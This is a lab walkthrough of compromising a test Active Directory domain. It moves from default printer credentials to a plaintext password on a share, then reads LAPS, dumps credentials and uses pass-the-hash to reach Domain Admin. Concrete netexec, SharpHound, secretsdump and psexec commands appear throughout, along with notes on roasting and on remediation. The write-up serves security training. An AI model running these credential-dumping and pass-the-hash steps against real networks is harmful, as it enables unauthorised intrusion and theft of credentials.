# Walkthrough: test.local, from network access to Domain Admin

Lab domain, CGNAT-style range (100.64.x.x). Starting point: I'm on the network
with no credentials. Below is roughly the order I actually worked it, including a
couple of dead ends, because that's how it really goes.

## 1. Map the domain

First just figure out what's there. The DC is obvious once you see
88/389/445/kerberos.

```bash
nmap -Pn -sC -sV -p- 100.64.5.0/24 -oA scans/full
# DC: 100.64.5.10  (53,88,135,139,389,445,464,593,636,3268,3269)
# print server: 100.64.5.40
# SRV01: 100.64.5.50 (3389 open)
```

The combination of 88 (Kerberos) + 389 (LDAP) + 445 is the tell for a DC. Pulled
the domain name off LDAP:

```bash
nxc ldap 100.64.5.10          # -> domain test.local, DC01.test.local
```

## 2. Foothold: default creds on the print server

Print management web UI on the print server was sitting on vendor defaults
(`admin:admin`). Not glamorous, but print/MFP devices are a classic soft entry —
nobody rotates them. Inside the config there was a stored credential for a
service account used to scan-to-folder, pointing at a share on SRV01.

Lesson I wrote down: peripherals are domain-joined too, and they hold creds.

## 3. Pivot: plaintext password on a share

With that service account I could read `\\SRV01\srv01-documents`. Someone had
left a handover note with a plaintext password in it (a readme for the next
admin). Checked it with netexec before trusting it:

```bash
nxc smb 100.64.5.50 -u j.admin -p '<redacted>'   # Pwn3d! on SRV01
```

## 4. Get interactive on SRV01 and run BloodHound from the inside

The account had RDP rights, so I landed on SRV01 and ran SharpHound to collect
the graph. Running it authenticated from inside gets you far more than a blind
external collect.

```powershell
# on SRV01
.\SharpHound.exe -c All --zipfilename sh.zip
```

Pulled the zip back and ingested into BloodHound CE. Details and the custom
queries I used are in [`bloodhound/`](bloodhound/).

## 5. The graph does the work: LAPS → svc-databackup → DA

BloodHound showed two things that mattered:

- SRV01 (which I controlled) had the right to **read LAPS** (`ms-Mcs-AdmPwd`) on
  another host. LAPS stores the local-admin password in a readable AD attribute —
  if you can read it, you own local admin on that box.
- That second host cached credentials for `svc-databackup`, and `svc-databackup`
  was a member of **Domain Admins** (a backup service account over-privileged, the
  usual story).

So: read LAPS → local admin on the second host → dump cached creds with
secretsdump → that's a DA. Shortest-path query in BloodHound drew the line from
my owned node straight to the Domain Admins group.

```bash
# dumping on a box where I have local admin (lab host, redacted secret)
secretsdump.py test.local/j.admin:'<redacted>'@100.64.5.60
# -> svc-databackup NT hash, which BloodHound flagged as DA
```

## 6. Prove DA

Pass-the-hash with the svc-databackup NT hash to the DC confirms domain admin:

```bash
nxc smb 100.64.5.10 -u svc-databackup -H '<nthash>'   # Pwn3d! on DC01
psexec.py -hashes :<nthash> test.local/svc-databackup@100.64.5.10
```

Game over — SYSTEM on the DC.

## Side quests (roasting)

Separately from the main path I practised the offline-cracking angle, because
it's the other way these domains fall:

- **AS-REP roasting** any account with "do not require pre-auth" set — no creds
  needed to request the AS-REP, then crack offline.
- **Kerberoasting** service accounts (SPNs) once I had any valid login.

Both are in [`roasting/`](roasting/). Neither was strictly needed for this box,
but a real domain usually has at least one roastable account and it's often the
fastest path.

## What actually killed this domain

Not Kerberos internals. It was: default device creds, a password in a file,
LAPS readable by the wrong principal, and a backup account in Domain Admins. The
[remediation notes](remediation.md) are all about those four, in priority order.
